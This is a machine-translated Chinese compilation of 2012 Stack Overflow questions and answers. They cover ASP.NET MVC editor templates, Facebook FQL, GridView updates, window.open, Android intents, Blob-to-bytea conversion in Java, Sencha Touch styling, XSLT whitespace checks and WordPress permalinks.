通常我通过@Html.RenderModel 渲染我的表单，但是这次我有一个复杂的渲染逻辑并且我手动渲染它。我决定为一个属性创建一个编辑器模板。这是代码（从默认对象编辑器模板实现中复制粘贴）：

```
<%@ Control Language="C#" Inherits="System.Web.Mvc.ViewUserControl" %>
<% var modelMetadata = ViewData.ModelMetadata; %>
<% if (modelMetadata.HideSurroundingHtml) { %>
    <%= Html.Editor(modelMetadata.PropertyName) %>
<% } else { %>
    <% if (!String.IsNullOrEmpty(Html.Label(modelMetadata.PropertyName).ToHtmlString())) { %>
        <div class="editor-label"><%= Html.Label(modelMetadata.PropertyName) %></div>
    <% } %>
    <div class="editor-field">
        <%= Html.Editor(modelMetadata.PropertyName) %>
        <%= Html.ValidationMessage(modelMetadata.PropertyName) %>
    </div>
<% } %> 
```

这是我使用它的方式：

```
@Html.EditorFor(x => x.SomeProperty, "Property") //"Property" is template above 
```

但它不起作用：无论 DisplayName 是什么都呈现标签，并且根本不呈现编辑器（在 Watches Html.Editor（modelMetadata.PropertyName 显示空字符串）中。我做错了什么？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-09-01T21:43:01.450

您正在从您的编辑器中调用编辑器。正如@RPM1984 在[此](https://stackoverflow.com/a/8163333/408643)答案的评论中改写@darin-dmitrov 一样：**在给定的 Views specific context 中，您只能在运行时为给定类型使用 1 个模板**。

如果您将视图更改为呈现文本框而不是编辑器，它可以工作，我只是尝试过：

```
<%@ Control Language="C#" Inherits="System.Web.Mvc.ViewUserControl" %>
<% var modelMetadata = ViewData.ModelMetadata; %>
<% if (modelMetadata.HideSurroundingHtml)
   { %>
   <%= Html.Editor(modelMetadata.PropertyName) %>
<% }
   else
   { %>
   <% if (!String.IsNullOrEmpty(modelMetadata.DisplayName))
       { %>
       <div class="editor-label"><%= Html.Label(modelMetadata.PropertyName) %></div>
    <% } %>
    <div class="editor-field"><%= Html.TextBox(modelMetadata.PropertyName) %> <%= Html.ValidationMessage(modelMetadata.PropertyName) %></div>
<% } %> 
```

如果您想渲染其他内容而不是文本框（即下拉列表），您需要在模板中为该属性确定并渲染它。或者，如果您有更多编辑器的共同点，我通常会将其提取到共享文件夹中的部分视图中，然后使用`Html.Partial("ViewName")`

而且，关于*无论 DisplayName 是否都呈现标签*，为了防止标签在没有显示名称的情况下呈现，请将您的 if 条件更改为`!String.IsNullOrEmpty(modelMetadata.DisplayName)`（我已经将它放在主代码块中）

**编辑** 此编辑涉及与 object.ascx 默认编辑器模板相关的问题。这是 object.ascx 的代码，取自[Brad Wilson 的博客](http://bradwilson.typepad.com/blog/2009/10/aspnet-mvc-2-templates-part-3-default-templates.html)：

```
<%@ Control Language="C#" Inherits="System.Web.Mvc.ViewUserControl" %>
<% if (ViewData.TemplateInfo.TemplateDepth > 1) { %>
    <%= ViewData.ModelMetadata.SimpleDisplayText%>
<% }
   else { %>    
    <% foreach (var prop in ViewData.ModelMetadata.Properties.Where(pm => pm.ShowForEdit
                         && !ViewData.TemplateInfo.Visited(pm))) { %>
        <% if (prop.HideSurroundingHtml) { %>
            <%= Html.Editor(prop.PropertyName) %>
        <% }
           else { %>
            <% if (!String.IsNullOrEmpty(Html.Label(prop.PropertyName).ToHtmlString())) { %>
                <div class="editor-label"><%= Html.Label(prop.PropertyName) %></div>
            <% } %>
            <div class="editor-field">
                <%= Html.Editor(prop.PropertyName) %>
                <%= Html.ValidationMessage(prop.PropertyName, "*") %>
            </div>
        <% } %>
    <% } %>
<% } %> 
```

此代码确实从编辑器内部调用 Html.Editor，但在为复杂模型的属性创建编辑器列表的循环内部。这些调用中的每一个都将调用相应的编辑器（即对于字符串，它将在那里显示 string.ascx 等），并且只有当您有一些不是字符串的“未知”属性并且没有特定的编辑器时（即字节 []）它将为其调用 object.ascx ，但这**不是**为当前属性调用编辑器（您要执行的操作）：

*对象模板的主要职责是显示复杂对象的所有属性，以及每个属性的标签。但是，它还负责显示模型的 NullDisplayText 的值（如果它为 null），并且它还负责确保您只显示一个级别的属性（也称为对象的“浅潜”）。在下一篇博文中，我们将讨论自定义此模板的方法，包括执行“深潜”操作。*

* * *

**概括**

精简版：

相同属性的更多编辑器基本上是功能差异的解决方案（“对于是/否，我想要这里的无线电组和那里的下拉菜单）”，对于视觉差异，应该使用部分视图，因为你可以尽可能多地嵌套它们，因为您明确地按名称调用它们，因此没有施加任何限制，您有责任防止任何潜在的递归。

长版：

我一直在调查这个，因为我有同样的问题，我正在使用编辑器模板来渲染`<li>`或`<td>`元素（取决于配置/主题）并从它内部调用另一个包含标签和输入的编辑器（两种情况相同，但如果属性为 bool 则输入在标签之前），我再次调用第三个模板进行输入（到防止标签/输入和输入/标签场景的重复代码），但这不起作用。虽然我没有在 msdn 或其他相关来源上找到解释，但我发现编辑器什么都不提供的唯一情况是当您想要为当前编辑器的上下文的属性呈现编辑器时（所以它实际上正是我已经引用：“在给定的 Views 特定上下文中，您只能在运行时为给定类型使用 1 个模板。”）。在考虑了更多之后，我现在相信他们施加这个限制是正确的，因为属性 x 只能使用一个编辑器呈现。您可以根据需要为属性 x 拥有任意数量的编辑器，但您不能使用多个模板渲染一个属性一次。您用于渲染属性 x 的任何模板都可以使用其他模板来渲染属性 x 的部分，但您不能多次对 x 使用（相同或不同）编辑器（相同的逻辑适用于拥有两个或多个属性 x（相同类型）和名称）在同一型号上）。

此外，如果您可以将当前属性的另一个模板插入到当前模板中，则可以为当前属性链接任意数量的模板，并且很容易导致递归，因此它会以一种或另一种方式引导您进入*stackoverflow* :)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T10:58:44.150

“x.SomeProperty”是什么类型的？我现在假设它的类型称为属性。

我的模型.cs

```
public class MyModel
{
    public Property SomeProperty { get; set; }
} 
```

属性.cs

```
public class Property
{
    [Display(Name="Foo")]
    public int Value { get; set; }
} 
```

视图/共享/EditorTemplates/Property.cshtml

```
@model MvcApplication1.Models.Property

@Html.LabelFor(model => model.Value)
@Html.EditorFor(model => model.Value)
@Html.ValidationMessageFor(model => model.Value) 
```

我的视图.cshtml

```
@Html.EditorFor(model=>model.SomeProperty) 
```

如果您没有为 EditorFor 助手提供模板名称，它会找到*名称与*SomeProperty的*type*匹配的 editortemplate 。

**更新：**

要为字符串制作自定义编辑器模板，请执行以下操作：

模型

```
public class MyModel
{
    public string SomeProperty { get; set; }
} 
```

看法：

```
@Html.EditorFor(model => model.SomeProperty,"Property") 
```

或者：

模型：

```
public class MyModel
{
    [DataType("Property")]
    public string SomeProperty { get; set; }
} 
```

看法：

```
@Html.EditorFor(model => model.SomeProperty) 
```

视图/共享/EditorTemplates/Property.cshtml：

```
@model string

@Html.Raw("I'm using property editortemplate:")
@Html.Label(ViewData.ModelMetadata.PropertyName)
@Html.Editor(ViewData.ModelMetadata.PropertyName)
@Html.ValidationMessage(ViewData.ModelMetadata.PropertyName) 
```

# jquery - Jquery“未实现”IE

> ID：12192230
> 
> 赞同：0
> 
> 时间：2012-08-30T07:48:33.100
> 
> 标签：jquery, internet-explorer

我最近将我的 jquery 更新到 1.8.0，自从这样做以来，我在 IE 8 上发现了一些错误，加载页面时它工作正常，尽管一旦点击顶部的“showreel”链接我的页面，它返回一个错误，说“未实现”。

[http://www.shannonhochkins.com/](http://www.shannonhochkins.com/)

我不知道它在说它没有实现是什么意思！有没有人遇到过这个问题？

![在此处输入图像描述](../Images/0e4cbca2d2c57446a024430e2d3f28b9.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:02:31.297

在您的文件 gallery.js 第 440 行和第 448 行中，您使用 $(body) - 这应该是 $('body') 或 $("body")。这可能不是唯一的错误。

IE 对此可能比其他浏览器更严格（我只是在这里猜测）。

使用插件 firebug 在 firefox 上尝试您的网站，并查看 firebug 控制台中的错误。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T04:21:16.647

您看到的特定错误在此处讨论[http://code.google.com/p/simplemodal/issues/detail?id=7](http://code.google.com/p/simplemodal/issues/detail?id=7)。听起来这是在标准模式下使用 IE8 中的对话框代码的问题。该讨论线程中建议了一种解决方法-您必须查看它是否适用于您的代码。

# facebook - Facebook API：如何使用位置（纬度 + 经度）发布状态更新？

> ID：12192235
> 
> 赞同：2
> 
> 时间：2012-08-30T07:48:51.967
> 
> 标签：facebook, facebook-graph-api, location

需要通过传递纬度和经度来发布状态更新并附加用户位置。在他们说的[FB 文档](https://developers.facebook.com/docs/reference/api/post/)中，我们需要传递“place” FB 实体，即：

*“一个对象，其中包含与该位置关联的页面的 ID 和名称，以及一个包含地理信息的位置字段，例如纬度、经度、国家和其他字段（字段将根据地理位置和信息的可用性而有所不同）”*

如何从纬度和经度创建/获取这样的地名？我已阅读相关[的 post1](https://stackoverflow.com/questions/10871517/post-status-update-with-location)和[post2](https://stackoverflow.com/questions/8244603/is-it-possible-to-create-a-facebook-place-through-the-graph-api)但无法找到可行的解决方案。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T05:29:33.663

> 如何从纬度和经度创建/获取这样的地名？

目前没有可供开发人员**创建**Facebook 页面或地点的 API。但是，您可以通过执行这样的 FQL 查询来**获取地名......**

```
'SELECT page_id,name,latitude,longitude FROM place WHERE distance(latitude, longitude, "LAT_HERE", "LON_HERE") < 250` 
```

`250`是指它将在其中搜索的半径（m），它可以上升到`50000`。

执行此 FQL 查询将返回 Facebook 地方页面的 id、**地名**、纬度和经度。

（实际上不需要获取地名，因为这`page_id`是您真正需要的。使用`page_id`，您将能够获取该 Facebook Place Page 的所有信息。）

> 需要通过传递纬度和经度来发布状态更新并附加用户位置。

假设您实际上是在尝试发布签到，您可以参考下面的参考资料以进一步处理您从 FQL 查询中获得的数据...

**正常的状态更新（提要对话框）不同于带有位置标记的状态更新（签到），它们使用不同的 API**。

**参考：**

[入住前如何获取place_id？](https://stackoverflow.com/questions/11828940/how-to-get-place-id-before-checkin/11882689#11882689)

[Facebook - 使用 PHP SDK/JavaScript SDK 发布签到](https://stackoverflow.com/questions/11072933/facebook-publish-checkins-using-php-sdk-javascript-sdk/11101740#11101740)

**Facebook 文档**

页面 FQL - [http://developers.facebook.com/docs/reference/fql/page/](http://developers.facebook.com/docs/reference/fql/page/)

签入 API - [http://developers.facebook.com/docs/reference/api/user/#checkins](http://developers.facebook.com/docs/reference/api/user/#checkins)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T19:24:53.500

如果您有纬度/经度数据，您可以搜索该地点并获取可包含在 POST 消息中的地点 ID。
请查看这些相关帖子 -
[https://developers.facebook.com/docs/opengraph/actions/#taggingplaces](https://developers.facebook.com/docs/opengraph/actions/#taggingplaces)
[https://developers.facebook.com/blog/post/2012/03/07/building-better-stories-与位置和朋友/](https://developers.facebook.com/blog/post/2012/03/07/building-better-stories-with-location-and-friends/)

# asp.net - 与 SqlDataSource 绑定时在 asp.net gridview 中更新

> ID：12192236
> 
> 赞同：0
> 
> 时间：2012-08-30T07:48:56.897
> 
> 标签：asp.net

我有一个与 .aspx 页面中的 SqlDataSource1 绑定的 GridView。但是当我使用事件“OnRowUpdating”并使用后面的代码更新它时。发生异常

> 除非指定了 UpdateCommand，否则数据源“SqlDataSource1”不支持更新。

我正在使用的 Gridview 是

```
 <asp:GridView ID="gdvProfiles" runat="server" AllowPaging="True" AllowSorting="True" DataSourceID="SqlDataSource1"
            OnRowUpdating="updateRecord" OnRowEditing="editRecord" OnRowCancelingEdit="cancelRecord"
            AutoGenerateColumns="False" CellPadding="0" ForeColor="#333333" GridLines="None"
            Style="margin-right: 38px" Font-Size="Small"> 
```

和 OnRowUpdaing

```
 protected void updateRecord(object sender, GridViewUpdateEventArgs e)
    {
        try
        {
            Label lblusername = gdvProfiles.Rows[e.RowIndex].FindControl("lblusername") as Label;
            TextBox txtname = gdvProfiles.Rows[e.RowIndex].FindControl("txtname") as TextBox;
            TextBox txtsponser = gdvProfiles.Rows[e.RowIndex].FindControl("txtsponser") as TextBox;
            TextBox txtemail = gdvProfiles.Rows[e.RowIndex].FindControl("txtemail") as TextBox;
            TextBox txtdob = gdvProfiles.Rows[e.RowIndex].FindControl("txtdob") as TextBox;

            TextBox txthomecontact = gdvProfiles.Rows[e.RowIndex].FindControl("txthomecontact") as TextBox;
            TextBox txtcontact = gdvProfiles.Rows[e.RowIndex].FindControl("txtcontact") as TextBox;
            TextBox txtaddress = gdvProfiles.Rows[e.RowIndex].FindControl("txtaddress") as TextBox;
            TextBox txtcity = gdvProfiles.Rows[e.RowIndex].FindControl("txtcity") as TextBox;
            TextBox txtstate = gdvProfiles.Rows[e.RowIndex].FindControl("txtstate") as TextBox;
            TextBox txtzipcode = gdvProfiles.Rows[e.RowIndex].FindControl("txtzipcode") as TextBox;
            TextBox txtcountry = gdvProfiles.Rows[e.RowIndex].FindControl("txtcountry") as TextBox;

            BORegistration oBORegistration = new BORegistration();
            BalRegistration oBalRegistration = new BalRegistration();
            oBORegistration.Name = lblusername.Text;

            oBORegistration.Name = txtname.Text;
            oBORegistration.Sponser = txtsponser.Text;
            oBORegistration.Email = txtemail.Text;
            oBORegistration.Dob = txtdob.Text;

            oBORegistration.HomeContact = txthomecontact.Text;
            oBORegistration.Contact = txtcontact.Text;
            oBORegistration.Addressx = txtaddress.Text;
            oBORegistration.City = txtcity.Text;
            oBORegistration.State = txtstate.Text;
            oBORegistration.ZipCode = txtzipcode.Text;
            oBORegistration.Country = txtcountry.Text;

            if (oBalRegistration.Updatememberprofile(oBORegistration))
            {
                gdvProfiles.EditIndex = -1;
                // FillData();
                gdvProfiles.DataBind();
            }
        }
        catch
        {
            throw;
        }
    } 
```

SqlDataSounce 是

```
 <asp:SqlDataSource ID="SqlDataSource1" runat="server" ConnectionString="<%$ ConnectionStrings:Universal %>"
        ProviderName="System.Data.SqlClient" SelectCommand="spGetMemberProfile" SelectCommandType="StoredProcedure"
        FilterExpression="Username LIKE '{0}%' OR Name LIKE '{0}%' OR           
        Sponser LIKE '{0}%' OR Email LIKE '{0}%' OR Dob LIKE '{0}%' OR
        HomeContact LIKE '{0}%' OR Contact LIKE '{0}%' OR City LIKE '{0}%' OR
        Statex LIKE '{0}%' OR ZipCode LIKE '{0}%' OR Country LIKE '{0}%'
        ">
        <FilterParameters>
            <asp:ControlParameter Name="ID" ControlID="txtFilter" />
        </FilterParameters>
    </asp:SqlDataSource> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:35:08.640

我通过在 SqlDataSqouce 中提到 UpdateCommand 来做到这一点

```
 <asp:SqlDataSource ID="SqlDataSource1" runat="server" ConnectionString="<%$ ConnectionStrings:Universal %>"
        ProviderName="System.Data.SqlClient" SelectCommand="spGetMemberProfile" UpdateCommand="spGetMemberProfile"
        SelectCommandType="StoredProcedure" FilterExpression="Username LIKE '{0}%' OR Name LIKE '{0}%' OR           
        Sponser LIKE '{0}%' OR Email LIKE '{0}%' OR Dob LIKE '{0}%' OR
        HomeContact LIKE '{0}%' OR Contact LIKE '{0}%' OR City LIKE '{0}%' OR
        Statex LIKE '{0}%' OR ZipCode LIKE '{0}%' OR Country LIKE '{0}%'
        ">
        <FilterParameters>
            <asp:ControlParameter Name="ID" ControlID="txtFilter" />
        </FilterParameters>
    </asp:SqlDataSource> 
```

# javascript - window.open：是否可以打开一个新窗口并修改其 DOM

> ID：12192239
> 
> 赞同：3
> 
> 时间：2012-08-30T07:48:59.330
> 
> 标签：javascript, dom, window

我要打开一个新窗口：</p>

```
var my = window.open('iframe.html', '_blank' ,"height=600, width=600"); 
```

但就在打开它时，我想修改它的 DOM，我尝试过：

```
var div = my.document.createElement("div");
div.innerHTML = "Hello!";
my.document.body.appendChild( div ); 
```

或者：

```
var div = $('<div>Hello World</div>');
$(my).contents().find('body').append(div); 
```

它们都不起作用；

那么当我打开它时是否可以修改我的 iframe DOM？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T09:43:10.770

只能**在**加载子窗口之前访问和修改 iframe DOM。

```
var my = window.open('iframe.html', '_blank' ,"height=600, width=600");

my.onload = function () {
 var div = my.document.createElement("div");
 div.innerHTML = "Hello!";
 my.document.body.appendChild( div );
}; 
```

另外，请确保在加载子窗口之前父窗口没有关闭。

# android - 如何从 Android 中的另一个 Activity 调用一个 Activity 的方法？

> ID：12192241
> 
> 赞同：-3
> 
> 时间：2012-08-30T07:49:00.020
> 
> 标签：android, android-activity

我有一个活动'A'扩展了调用服务的mapActivity，还有一个扩展服务的服务'B'。我在服务“B”中得到纬度和经度。现在我需要调用 Activity 'A' 中的方法并传递纬度和经度。在那种方法中，我有代码来显示位置。提前致谢..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T07:51:45.820

请参阅[http://developer.android.com/reference/android/app/Activity.html#StartingActivities](http://developer.android.com/reference/android/app/Activity.html#StartingActivities)

*   A 活动应该使用`startActivityForResult()`方法启动 B 活动
*   `setResult()`B活动应该在做之前设置要返回的数据（纬度和经度）`finish()`
*   A 活动必须重写`onActivityResult()`以从 B 检索数据

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T08:43:51.303

使用意图是最简单也是最好的方法。在活动 A 中有这个代码来创建意图：

```
Intent intent=new intent(this,B.class); 
```

/*处理完需要发送给活动B的数据后*/

/*如果要传递数据*/

```
intent.putExtra("Data", data);
  startActivity(i); 
```

在活动 B 中，将其接收为：

```
 Intent intent = getIntent();

 String text = intent.getStringExtra("Data"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-30T08:25:06.037

Intents 用于在活动之间传递短消息。使用 Intent 并添加额外内容以从服务启动活动您还需要添加额外的标志以从服务启动活动。

这是参考

[http://developer.android.com/reference/android/content/Intent.html](http://developer.android.com/reference/android/content/Intent.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-28T07:01:40.723

创建该类对象并调用特定方法

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-30T07:55:02.407

您正在使用一个活动和一个服务，而不是两个活动，并且您希望活动和服务之间进行交互。为此，请使用 BoundService。请参阅以下链接以获取更多参考：

[http://developer.android.com/guide/components/bound-services.html](http://developer.android.com/guide/components/bound-services.html)

或者，您可以在 Activity 中定义 A messenger，并可以将消息从服​​务发送到活动。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-30T07:56:21.813

您必须更新一些服务的活动。扩展活动的类是活动。所以在你的情况下 B 是服务

尝试使用`runnable`和`handler`更新服务中的活动

[在这里检查](https://stackoverflow.com/questions/11771506/update-activity-from-service-using-handler)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-08-30T07:57:17.443

使用意图呼叫另一个

```
 Intent i= new Intent (this,B.class);
   startActivity(i); 
```

这是一个简单的调用方式

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2016-04-01T07:59:34.293

您不应创建活动类的实例。这是错误的。活动有 ui 和生命周期，活动由 startActivity(intent) 启动

您可以使用 startActivityForResult 或者您可以使用意图将值从一个活动传递到另一个活动并执行所需的操作。但这取决于您打算在该方法中做什么。

我可以知道确切的要求，为什么你需要调用另一个活动方法？

# iphone - 从 FQL 中的用户表中获取个人资料图片创建日期

> ID：12192247
> 
> 赞同：0
> 
> 时间：2012-08-30T07:49:27.373
> 
> 标签：iphone, objective-c, ios, facebook-fql, fql.multiquery

如何使用 获取我的朋友个人资料图片的创建日期`FQL multi-query`？

我写了下面的查询：

```
SELECT src_small, src_big, src FROM photo WHERE src IN
(SELECT pic_square, pic_small, pic_big, pic FROM user WHERE uid IN
(SELECT uid2 FROM friend WHERE uid1 = me()) ) 
```

但它说：

```
{

  "error": {
  "message": "Your statement is not indexable. The WHERE clause must contain an indexable column.    Such columns are marked with * in the tables linked from   http://developers.facebook.com/docs/reference/fql ", 
  "type": "NoIndexFunctionException", 
  "code": 604
 }
} 
```

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T14:56:14.510

> 来自 Arjuna Del Toso 的评论：
> 
> 只有在 WHERE 子句中标记为“可索引”时，才能使用该列

不，这并不完全正确。

您的 where 子句*中至少需要一个*可索引列——一旦有了，您也可以使用其他非索引列来进一步限制结果。

* * *

由于用户当前的头像总是他们*头像相册的**相册封面照片*，我们可以使用它来获取我们朋友的头像，然后使用它从表格中选择我们想要的信息：*`object_id``photo`*

 *```
SELECT owner, src_small, created FROM photo WHERE object_id IN (
  SELECT cover_object_id FROM album WHERE owner IN (
    SELECT uid1 FROM friend WHERE uid2 = me()
  ) AND name = 'Profile Pictures'
) 
```*

# java - 在java中将Blob转换为bytea

> ID：12192250
> 
> 赞同：1
> 
> 时间：2012-08-30T07:49:35.540
> 
> 标签：java, postgresql, jdbc, postgresql-9.1

我在 postgresql 数据库中工作，我需要仅使用 java 代码将 MYSQL Blob 数据类型转换为 PostgreSQL bytea 有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T07:57:09.800

```
//(assuming you have a ResultSet named RS)
PreparedStatement psMySql = connMySql.prepareStatement("select myBlob from myTable where ...");
Blob blob = rs.getBlob("myBlob");

int blobLength = (int) blob.length();  
byte[] blobAsBytes = blob.getBytes(1, blobLength);

PreparedStatement psPostresql = connPostgresql.prepareStatement("INSERT INTO myNewTable VALUES (?, ?)");
psPostresql.setString(1, myId);
psPostresql.setBytes(2, blobAsBytes);
psPostresql.executeUpdate();

//release the blob and free up memory.
blob.free(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T07:54:14.030

据我所知，两者都支持 JDBC 驱动程序。并且 JDBC 具有处理 BLOB 的标准方法。我一直在 DB2 中这样做。

所以：

*   连接到 MySQL
*   做一个选择。假设 blob 列是 FIELD_BLOB
*   rs.getBytes("FIELD_BLOB")
*   连接到 Postgres
*   做一个 PreparedStatement
*   在这个preparestatement上调用setBytes，传入你从MySQL得到的字节

如果 getBytes、setBytes 不起作用，请尝试使用输入和输出流。

# sencha-touch - 如何减少 sencha touch 2 列表项高度

> ID：12192253
> 
> 赞同：1
> 
> 时间：2012-08-30T07:49:44.307
> 
> 标签：sencha-touch, sencha-touch-2

Sencha touch 2中如何降低列表项的高度？我的列表显示了大量的单个单词名称/值对。随着每个项目的高度增加，列表变得太长。所以我想将每个项目的高度降低到确切的内容高度。我试过像这样使用css，但没有运气。有什么帮助吗？

var tabPanel=Ext.create('Ext.TabPanel', {

```
fullscreen: true,
    tabBarPosition: 'top',
defaults: {
      styleHtmlContent: true
    },

    items: [
    {
        title: 'DETAILS', 
    xtype: 'list',
        cls: 'myList',
        ....
        itemTpl: '<table><tr><td>{fieldName}</td><td>{fieldValue}</td></tr></table>',
    .............

.myList .x-list-item {
       max-height: 30px;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-01T09:26:58.633

每个列表项的最小高度为 2.6em。因此，您可以减少它并添加溢出属性。用这个：

```
.my-list .x-list-item .x-list-item-label{
     min-height: 0.8em !important;
     overflow : auto;
} 
```

而且在里面使用 Html 表格也不是一个好习惯`itemTpl`。使用带有`-webkit-box`CSS3 属性的普通 DIV 元素。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-27T06:54:40.027

您可以使用列表的 itemHeight 配置。[http://docs.sencha.com/touch/2-1/#!/api/Ext.dataview.List-cfg-itemHeight](http://docs.sencha.com/touch/2-1/#!/api/Ext.dataview.List-cfg-itemHeight)

除此之外，您还可以使用这样的 CSS 来控制填充：

```
.my-list .x-list-item  .x-list-item-body{
     min-height: 0.5em !important;
     padding-top: 0.3em;
     padding-bottom: 0.3em;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-23T08:14:34.673

使用一个名为 as

`itemHeight: [*Height of the item you need*],`

IE

```
itemHeight: 40 
```

从组件的 JS 文件中读取

# xml - 如何检查 XML 节点是否包含文本

> ID：12192259
> 
> 赞同：5
> 
> 时间：2012-08-30T07:50:05.307
> 
> 标签：xml, xslt, xslt-2.0

如何检查 XML 节点是否包含文本或仅包含空节点？

示例：假设我们有以下 XML：

```
<text>
   <p> </p>
   <p> </p>
</text> 
```

（注意 p 标签之间的空格）

在不同的 XML 中，我们有以下 XML：

```
<text>
   <p>Hello World!</p>
</text> 
```

我希望测试在第二个示例中通过，但在第一个示例中不通过，因为第二个示例包含文本，但第一个示例包含空节点。

有没有办法轻松实现这一目标？

（我使用 XSLT 2.0。）

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-30T08:02:49.607

我认为`normalize-space`你想要什么，例如这将“通过”：

```
<xsl:if test="normalize-space(/text/p) != ''">
    ...
</xsl:if> 
```

`normalize-space` 将从字符串中修剪所有前导和尾随空格，这将在您的第二个示例中留下文本，但删除第一个示例中的所有字符，以便您与空字符串进行比较`''`。

请注意，它还将多个空白字符按顺序压缩为单个字符，例如`hello<space><space><space>there`将变为`hello<space>there`.

[http://www.w3.org/TR/xpath/#function-normalize-space](http://www.w3.org/TR/xpath/#function-normalize-space) (XPath 1)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-08-30T13:04:00.373

**使用**：

```
p[normalize-space()] 
```

这将选择`p`上下文（当前）节点的任何子节点，其字符串值不是空字符串或纯空格字符串。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-30T08:20:43.023

如果你把

```
<xsl:strip-space elements="*"/> 
```

在样式表的顶部，解析器将忽略输入文档中完全由空格组成的文本节点。除其他外，这意味着您的`p`带有空格的示例元素将被视为与完全空的元素相同。例如，模板匹配`text[p/text()]`将匹配`text`第二个示例中的元素，但不匹配其`p`子元素全部为空（或仅包含空格）的元素。

# asp.net - 删除操作后 ASP.NET Gridview 不刷新

> ID：12192262
> 
> 赞同：0
> 
> 时间：2012-08-30T07:50:17.170
> 
> 标签：asp.net, gridview, internet-explorer-8

我有 Internet Explorer 8。我有一个 asp:GridView，我在其中显示记录和图像按钮以执行删除操作。我正在删除记录并在 gridview 的 RowComand 事件上调用我 BindMethod。问题是删除记录后 Internet Explorer 不刷新。我已经检查了 Firefox 和 chrome。他们工作正常。

这是我的代码：ASPX：

```
 <asp:GridView ID="grd" runat="server" CssClass="grd" EmptyDataText="No record found."
EnableViewState="true" AutoGenerateColumns="False" AllowPaging="False" 
OnRowCommand="grdView_RowCommand" OnRowDataBound="grdView_RowDataBound" 
OnPageIndexChanging="grdView_PageIndexChanging">
     <Columns>
      bla
      bla
      bla
      bla
      bla
     </Columns>
    </asp:GridView> 
```

代码背后

```
private void BindGrid()
{
     string sSQL = "select * from tableName";
     DataTable dt = DAL.getDataTable(sSQL);
     grd.DataSource = dt;
     grd.DataBind();
}

protected void grdView_RowCommand(Object sender, GridViewCommandEventArgs e)
{
      int id= Convert.ToInt32(e.CommandArgument);
      //Deleting record
      bool result = DAL.DeleteRecord(id);
      if(result)
      {
          BindGrid();
      }
} 
```

请告诉我为什么 Internet Explorer 没有刷新网格，而其他浏览器工作正常。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T02:32:00.807

试试这个，当您尝试删除一行时，grdView_`RowCommand`不会触发。使用 grdView_`RowDeleting`如下所示。grdView_`RowCommand`只会在您`GridView`绑定时触发

```
protected void grdView_RowDeleting(object sender, GridViewDeleteEventArgs e)
{
  int id= Convert.ToInt32(e.CommandArgument);
  //Deleting record
  bool result = DAL.DeleteRecord(id);
  if(result)
  {
      BindGrid();
  }
} 
```

# wordpress - wordpress“页面”永久链接不起作用，全部重定向到主页

> ID：12192271
> 
> 赞同：1
> 
> 时间：2012-08-30T07:50:38.223
> 
> 标签：wordpress, .htaccess, redirect, permalinks

我的 wordpress 网站表现得很奇怪。问题是这样的：

该页面`www.mysite.com/about-us`未显示，但显示主页内容。

此外，当您键入一些未退出`www.mysite.com/abcdef`的页面时，例如还显示主页，而不是`404 error`.

（我正在使用链接结构。和一个名为从链接中删除父类别`/%category%/%postname%.html`的插件。）`no parent categories`

我尝试将链接结构设置为默认并禁用插件，仍然没有用。

有人可以帮忙吗？

# javascript - 有谁知道是否有任何 jquery 插件可以在图像上写入文本并让用户将其放置在图像内的任何位置？

> ID：12192274
> 
> 赞同：2
> 
> 时间：2012-08-30T07:50:49.160
> 
> 标签：javascript, jquery, css, html

我正在寻找可以帮助您在图像上放置文本/形状的 jquery 或 js 库。就像在这个网站[http://picfont.com/](http://picfont.com/)中一样， 它可以让您通过拖放将文本放在图像上的任何位置。

提前致谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-30T07:56:26.087

答案取决于您是否希望生成的文本嵌入到图像中（即作为像素），以便您可以将整个图像（包括文本）保存为文件，或者您是否愿意让文本漂浮在上方图片。

在后一种情况下，只需使用`<div>`可以绝对定位在`<img>`元素顶部的 a 。

在前一种情况下，我知道的唯一选择是使用 HTML5`<canvas>`元素，然后使用`.fillText()`将文本写入画布：

```
var canvas = document.getElementById('canvas'),
    ctx = canvas.getContext('2d'),
    img = new Image;

img.onload = function() {
    canvas.width = this.width;
    canvas.height = this.height;
    ctx.drawImage(this, 0, 0);
    ctx.font = "36pt Verdana";

    ctx.fillStyle = "black";
    ctx.fillText("Test Text", 42, 82);

    ctx.fillStyle = "white";
    ctx.fillText("Test Text", 40, 80);
};

img.src = ...; 
```

另请参阅[http://jsfiddle.net/D8ZZS/2/](http://jsfiddle.net/D8ZZS/2/)以了解上述变体，其中`<input type="file">`使用 HTML5`FileReader`界面从控件加载图像。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T07:54:49.767

我之前说过，[谷歌](https://www.google.ro/search?q=text%20on%20image%20jquery%20plugin&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla%3aen-US%3aofficial&client=firefox-a&channel=fflb)是任何知道使用搜索引擎的人最好的朋友 :)

